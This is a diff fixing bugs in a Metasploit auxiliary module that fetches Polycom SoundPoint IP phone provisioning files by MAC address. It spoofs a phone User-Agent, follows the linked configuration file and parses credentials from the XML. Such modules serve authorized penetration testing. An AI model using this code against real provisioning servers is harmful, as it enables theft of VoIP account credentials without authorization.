@@ -42,20 +42,20 @@ class Metasploit3 < Msf::Auxiliary
       macs = []
     end
     macs << datastore['MAC'].upcase if datastore['MAC']
-    uri=datastora["TARGETURI"] || "/"
+    uri=datastore["TARGETURI"] || "/"
 
 
     macs.each do |mac|
       begin
-        vprint_status("The initial configuration file is requesting: #{uri}#{mac.downcase}.cfg")
+        vprint_status("The initial configuration file is requesting: #{uri}/#{mac.downcase}.cfg")
         res = send_request_cgi({
-           'uri'          =>  "#{uri}#{mac.downcase}.cfg",
+           'uri'          =>  "#{uri}/#{mac.downcase}.cfg",
            'method'       => 'GET',
            'User-Agent'   => 'FileTransport PolycomSoundPointIP-SPIP_335-UA/4.2.2.0710',
         }, 20)
         if res.code == 200
-          vprint_status("The second configuration file is requesting: /#{file}")
           file=extract_conf_file(res.body)
+          vprint_status("The second configuration file is requesting: /#{file}")
           res = send_request_cgi({
              'uri'          =>  "/#{file}",
              'method'       => 'GET',
@@ -83,12 +83,12 @@ class Metasploit3 < Msf::Auxiliary
   def extract_conf_file(data)
     doc = Nokogiri::XML(data)
     file=doc.at("APPLICATION")["CONFIG_FILES"].split(",")[1]
-    vprint_status(data)
+    vprint_debug(data) if datastore["DEBUG"] == true
     return file
   end
   def extract_creds(data)
     doc = Nokogiri::XML(data)
-    vprint_status(data)
+    vprint_debug(data) if datastore["DEBUG"] == true
     case
       when doc.at('phone')
         d=doc.at('phone')
